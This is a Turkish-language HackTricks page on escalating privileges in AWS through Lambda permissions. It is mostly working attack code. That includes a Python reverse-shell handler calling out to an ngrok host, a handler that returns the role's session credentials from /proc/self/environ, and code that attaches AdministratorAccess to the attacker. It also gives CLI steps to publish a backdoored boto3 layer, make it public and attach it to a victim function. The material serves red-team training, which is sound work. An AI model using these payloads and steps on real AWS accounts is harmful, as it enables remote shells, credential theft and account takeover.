# AWS - Lambda Privesc

{% hint style="success" %}
AWS Hacking öğrenin ve pratik yapın:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğrenin ve pratik yapın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 Discord grubuna** [**katılın**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **HackTricks'e PR göndererek hacking ipuçlarını paylaşın** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına.

</details>
{% endhint %}

## lambda

lambda hakkında daha fazla bilgi:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:InvokeFunction`** izinlerine sahip kullanıcılar ayrıcalıklarını yükseltebilirler.\
**Yeni bir Lambda fonksiyonu oluşturabilir ve mevcut bir IAM rolünü atayabilirler**, bu da fonksiyona o role bağlı izinleri verir. Kullanıcı daha sonra **bu Lambda fonksiyonuna kod yazabilir ve yükleyebilir (örneğin bir rev shell ile)**.\
Fonksiyon kurulduktan sonra, kullanıcı **AWS API aracılığıyla Lambda fonksiyonunu çağırarak** fonksiyonun çalışmasını ve istenen eylemleri tetikleyebilir. Bu yaklaşım, kullanıcının Lambda fonksiyonu aracılığıyla dolaylı olarak görevleri gerçekleştirmesine olanak tanır ve bu fonksiyonla ilişkili IAM rolü tarafından verilen erişim düzeyiyle çalışır.\\

Bir saldırgan bunu **rev shell almak ve token çalmak** için kötüye kullanabilir:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Lambda rol izinlerini lambda fonksiyonundan da **kötüye kullanabilirsiniz**.\
Eğer lambda rolü yeterli izinlere sahipse, bunu kendinize yönetici hakları vermek için kullanabilirsiniz:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Lambda'nın rol kimlik bilgilerini harici bir bağlantıya ihtiyaç duymadan sızdırmak da mümkündür. Bu, dahili görevlerde kullanılan **Network isolated Lambdas** için yararlı olacaktır. Eğer ters kabuklarınızı filtreleyen bilinmeyen güvenlik grupları varsa, bu kod parçası kimlik bilgilerini doğrudan lambda'nın çıktısı olarak sızdırmanıza olanak tanır.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potansiyel Etki:** Belirtilen keyfi lambda servis rolüne doğrudan privesc.

{% hint style="danger" %}
İlginç görünebilir ama **`lambda:InvokeAsync`** kendi başına **`aws lambda invoke-async`** çalıştırmaya izin **vermez**, ayrıca `lambda:InvokeFunction` da gereklidir.
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Önceki senaryoda olduğu gibi, **`lambda:InvokeFunction`** iznini **kendinize verebilirsiniz** eğer **`lambda:AddPermission`** iznine sahipseniz.
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potansiyel Etki:** Belirtilen keyfi lambda servis rolüne doğrudan privesc.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

**`iam:PassRole`, `lambda:CreateFunction` ve `lambda:CreateEventSourceMapping`** izinlerine sahip kullanıcılar (ve potansiyel olarak `dynamodb:PutItem` ve `dynamodb:CreateTable`) **lambda:InvokeFunction** olmadan bile dolaylı olarak **ayrıcalıkları yükseltebilir**.\
**Kötü niyetli kod içeren bir Lambda fonksiyonu oluşturabilir ve ona mevcut bir IAM rolü atayabilirler**.

Lambda'yı doğrudan çağırmak yerine, kullanıcı bir DynamoDB tablosu kurar veya mevcut bir tabloyu kullanır ve bunu bir olay kaynağı eşlemesi aracılığıyla Lambda'ya bağlar. Bu kurulum, Lambda fonksiyonunun **tabloya yeni bir öğe girişi olduğunda otomatik olarak tetiklenmesini** sağlar, ya kullanıcının eylemiyle ya da başka bir süreçle, böylece Lambda fonksiyonunu dolaylı olarak çağırır ve kodu geçirilen IAM rolünün izinleriyle çalıştırır.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Eğer DynamoDB AWS ortamında zaten aktifse, kullanıcı sadece Lambda fonksiyonu için **olay kaynağı eşlemesini kurmalıdır**. Ancak, DynamoDB kullanılmıyorsa, kullanıcı **akış özelliği etkinleştirilmiş yeni bir tablo oluşturmalıdır**:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Artık **bir olay kaynağı eşlemesi oluşturarak** **Lambda işlevini DynamoDB tablosuna bağlamak** mümkün:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Lambda işlevi DynamoDB akışına bağlı olduğunda, saldırgan **DynamoDB akışını etkinleştirerek Lambda'yı dolaylı olarak tetikleyebilir**. Bu, DynamoDB tablosuna **bir öğe ekleyerek** gerçekleştirilebilir:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potansiyel Etki:** Belirtilen lambda servis rolüne doğrudan yetki yükseltme.

### `lambda:AddPermission`

Bu izne sahip bir saldırgan **kendisine (veya başkalarına) herhangi bir izin verebilir** (bu, kaynağa erişim izni vermek için kaynak tabanlı politikalar oluşturur):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potansiyel Etki:** Kodu değiştirme ve çalıştırma izni vererek lambda servis rolüne doğrudan privesc.

### `lambda:AddLayerVersionPermission`

Bu izne sahip bir saldırgan, **kendisine (veya başkalarına) `lambda:GetLayerVersion` izni verebilir**. Katmana erişebilir ve güvenlik açıkları veya hassas bilgiler arayabilir.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potansiyel Etki:** Hassas bilgilere potansiyel erişim.

### `lambda:UpdateFunctionCode`

**`lambda:UpdateFunctionCode`** iznine sahip kullanıcılar, **IAM rolüne bağlı mevcut bir Lambda fonksiyonunun kodunu değiştirme potansiyeline sahiptir.**\
Saldırgan, **Lambda'nın kodunu IAM kimlik bilgilerini sızdıracak şekilde değiştirebilir.**

Saldırganın fonksiyonu doğrudan çağırma yeteneği olmasa da, Lambda fonksiyonu önceden var ve çalışıyorsa, mevcut iş akışları veya olaylar aracılığıyla tetiklenmesi muhtemeldir, bu da dolaylı olarak değiştirilmiş kodun çalıştırılmasını kolaylaştırır.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potansiyel Etki:** Kullanılan lambda servis rolüne doğrudan privesc.

### `lambda:UpdateFunctionConfiguration`

#### Giriş

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html), **kodu** lambda fonksiyonunuza dahil etmenize olanak tanır ancak **ayrı olarak depolayarak**, böylece fonksiyon kodu küçük kalabilir ve **birkaç fonksiyon kodu paylaşabilir**.

Lambda içinde, python kodunun yüklendiği yolları aşağıdaki gibi bir fonksiyonla kontrol edebilirsiniz:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Bunlar yerler:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Örneğin, boto3 kütüphanesi `/var/runtime/boto3` (4. pozisyon) konumundan yüklenir.

#### Exploitation

`lambda:UpdateFunctionConfiguration` iznini kötüye kullanarak bir lambda fonksiyonuna **yeni bir katman eklemek** mümkündür. Keyfi kod çalıştırmak için bu katmanın, lambda'nın **içe aktaracağı bir kütüphane içermesi** gerekir. Lambda'nın kodunu okuyabiliyorsanız, bunu kolayca bulabilirsiniz, ayrıca lambda'nın **zaten bir katman kullanıyor olabileceğini** ve bu katmanı **indirip** **kendi kodunuzu ekleyebileceğinizi** unutmayın.

Örneğin, lambda'nın boto3 kütüphanesini kullandığını varsayalım, bu, kütüphanenin son sürümüyle yerel bir katman oluşturacaktır:
```
pip3 install -t ./lambda_layer boto3
```
`./lambda_layer/boto3/__init__.py` dosyasını açabilir ve **global koda arka kapı ekleyebilirsiniz** (örneğin, kimlik bilgilerini sızdırmak veya ters kabuk almak için bir fonksiyon).

Ardından, `./lambda_layer` dizinini zipleyin ve **yeni lambda katmanını** kendi hesabınıza (veya kurbanın hesabına, ancak bunun için izinleriniz olmayabilir) yükleyin.\
Kütüphaneleri geçersiz kılmak için bir python klasörü oluşturmanız ve kütüphaneleri oraya koymanız gerektiğini unutmayın. Ayrıca, katmanın **lambda tarafından kullanılan python sürümüyle uyumlu** olması ve kendi hesabınıza yüklerseniz, **aynı bölgede** olması gerekir:

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Şimdi, yüklenen lambda katmanını **herhangi bir hesap tarafından erişilebilir** hale getirin:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Ve lambda katmanını kurban lambda fonksiyonuna ekleyin:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
Bir sonraki adım, eğer yapabiliyorsak **fonksiyonu kendimiz çağırmak** ya da **normal yollarla çağrılmasını beklemek** olacaktır - bu daha güvenli bir yöntemdir.

Bu zafiyeti **daha gizli bir şekilde istismar etmenin** bir yolu şurada bulunabilir:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potansiyel Etki:** Kullanılan lambda servis rolüne doğrudan privesc.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Belki bu izinlerle bir fonksiyon oluşturup URL'yi çağırarak çalıştırabilirsiniz... ama bunu test etmenin bir yolunu bulamadım, eğer bulursanız bana bildirin!

### Lambda MitM

Bazı lambdalar **kullanıcılardan gelen hassas bilgileri parametrelerde alacak.** Eğer bunlardan birinde RCE elde ederseniz, diğer kullanıcıların gönderdiği bilgileri dışarı sızdırabilirsiniz, şuradan kontrol edin:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referanslar

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
AWS Hacking öğren & pratik yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking öğren & pratik yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekle</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live) bizi takip edin.
* **HackTricks'e** [**PR göndererek**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna katkıda bulunarak hacking ipuçlarını paylaşın.

</details>
{% endhint %}
